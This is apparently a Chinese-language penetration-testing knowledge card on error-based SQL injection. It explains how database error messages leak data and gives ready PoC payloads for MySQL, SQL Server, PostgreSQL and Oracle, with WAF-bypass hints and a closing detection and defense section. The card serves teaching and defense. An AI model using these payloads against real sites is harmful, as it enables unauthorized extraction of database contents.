---
id: web-generic-sqli-error-based-extraction
title: SQL 报错注入：用 updatexml、extractvalue 与类型转换错误回显数据
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-error-based-extraction
tags:
- sqli
- error-based
- updatexml
- extractvalue
- mysql
- mssql
- oracle
- postgresql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:15:35+08:00'
  notes: 原文无图片，已核对报错注入：updatexml/extractvalue 非法 XPath、floor(rand) 重复键、exp(~) 溢出、SQL Server CONVERT/CAST、PostgreSQL CAST、Oracle utl_inaddr 均与原文一致；卡中已注明 name_const 需常量、不可靠，并标注 updatexml 约 32 字符长度限制。原文未涉及版本区间。未执行 PoC。
url: /docs/web/generic/sqli/web-generic-sqli-error-based-extraction/
draft: false
kb_aliases:
- 报错注入
- updatexml 注入
- extractvalue 注入
- floor 报错注入
- 类型转换报错注入
- Error-based SQL injection
---

## 一句话结论

当 SQL 注入没有联合查询回显位、布尔/时间盲注又太慢时，可故意让数据库在错误信息中拼接查询结果：MySQL 用 `updatexml()`/`extractvalue()` 的非法 XPath、`floor()` 的重复键错误或 `exp()` 溢出，SQL Server 用 `CONVERT`/`CAST` 类型转换失败，Oracle/PostgreSQL 用不兼容类型或函数报错，把数据带到页面错误信息里。

## 原理

- 多数数据库在语法/函数参数错误时会把出错的值或表达式片段写进错误信息；如果错误信息被应用直接回显到页面，就形成了数据外带通道。
- MySQL：
  - `updatexml(xml_doc, xpath, new_value)` 在 XPath 非法时报错，错误信息会包含非法 XPath 的内容。把 `concat(0x7e, (SELECT ...), 0x7e)` 作为 XPath，查询结果就出现在错误里。
  - `extractvalue(xml_doc, xpath)` 同理，XPath 非法时回显内容。
  - `floor(rand(0)*2)` 配合 `GROUP BY` 制造“Duplicate entry”错误，把 `concat(查询结果, floor(rand(0)*2))` 作为分组键，值会出现在重复键错误中。
  - `exp(~(SELECT ...))` 通过按位取反把结果变成超大正数，触发 `DOUBLE value is out of range` 错误并带出子查询结果。
- SQL Server：`CONVERT(int, '非数字')`/`CAST('非数字' AS int)` 报转换失败，把子查询结果作为字符串转换即可回显。
- PostgreSQL：`CAST((SELECT ...) AS int)` 对非数字文本报错，错误信息包含原值。
- Oracle：`utl_inaddr.get_host_address()`、`ctxsys.drithsx.sn()`、`dbms_utility.sqlcode_to_char()` 等函数在参数非法时报错并带出内容；部分函数需要额外权限。
- 报错注入的前提是错误信息可见（调试模式、详细错误页、数据库错误直出），且 WAF 未拦截相关函数。

## 触发条件

- 存在 SQL 注入，且页面会回显数据库错误信息（或错误信息写入可访问的日志）。
- 目标数据库版本支持上述函数（MySQL 5.1+ 的 `updatexml`/`extractvalue`，`exp` 溢出在常见版本可用）。
- 当前数据库用户有执行相应函数的权限；Oracle 的某些包需要额外授权。
- 查询结果长度受错误信息长度限制，通常需要 `SUBSTR` 分段。

## 利用步骤

1. 先触发一个普通语法错误，确认错误信息会回显、以及数据库类型。
2. 选择对应数据库的报错函数，先用 `SELECT database()`/`@@version` 等短数据验证。
3. 用 `concat`/`||` 拼接分隔符（如 `0x7e` 即 `~`），方便从错误信息中定位结果。
4. 对长数据用 `SUBSTR`/`SUBSTRING` 分段，逐段提取。
5. 若 `updatexml`/`extractvalue` 被过滤，改用 `floor`、`exp` 或类型转换。
6. 若错误信息不回显，考虑把错误写入日志再通过 LFI 读取（较少见），或改用盲注/带外。

## PoC

MySQL `updatexml`：

```sql
?id=1' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)-- -
```

错误信息示例：

```text
XPATH syntax error: '~security~'
```

MySQL `extractvalue`：

```sql
?id=1' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))-- -
```

MySQL `floor` 重复键：

```sql
?id=1' AND (SELECT 1 FROM (SELECT count(*), concat((SELECT database()), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -
```

MySQL `exp` 溢出：

```sql
?id=1' AND exp(~(SELECT * FROM (SELECT database()) x))-- -
```

SQL Server 类型转换：

```sql
?id=1' AND 1=CONVERT(int, (SELECT DB_NAME()))-- -
```

PostgreSQL 类型转换：

```sql
?id=1' AND 1=CAST((SELECT version()) AS int)-- -
```

Oracle 变体（需相应权限）：

```sql
?id=1' AND 1=(SELECT utl_inaddr.get_host_address((SELECT user FROM dual)))-- -
```

说明：

- `updatexml`/`extractvalue` 的错误信息长度有限（通常约 32 字符），长数据需 `SUBSTR` 分段。
- `floor` 方案依赖 `rand(0)` 的固定序列和 `GROUP BY` 的重复键行为，不同 MySQL 版本/优化器可能不稳定。
- `exp` 方案要求子查询返回可被按位取反的值，数据类型不匹配时可能直接报其他错误。
- 报错函数可能被 WAF 关键字拦截，可尝试大小写、注释、`/**/`、函数名拆分等绕过。

## 变体与关联

- 变体：`name_const()` 重复列名报错在部分版本可用，但参数必须是常量，不能可靠带入子查询，优先用 `updatexml`/`extractvalue`。
- 变体：SQL Server 用 `CAST`/`CONVERT` 转 `int`、`datetime`、`uniqueidentifier` 触发不同错误；Oracle 用 `to_number`、`utl_http` 等。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（无报错回显时的布尔/时间替代）。
- 关联：[[web-generic-sqli-dnslog-oob-exfiltration]]（错误信息也不可见时的带外通道）。
- 边界：应用关闭详细错误、统一返回 500 通用页、WAF 拦截报错函数时，本手法失效。

## 检测与防御

- 修复：参数化查询；生产环境关闭详细数据库错误，统一返回通用错误页，错误详情只写服务端日志。
- 加固：数据库账号最小权限，撤销不必要的包/函数执行权；WAF 覆盖 `updatexml`、`extractvalue`、`floor(rand`、`exp(~`、`CONVERT(int` 等特征。
- 检测：SQL 日志/应用日志中出现上述函数与 `concat`/`substr` 组合；页面响应出现 `XPATH syntax error`、`Duplicate entry`、`Conversion failed` 等数据库错误；同一参数高频触发语法错误。
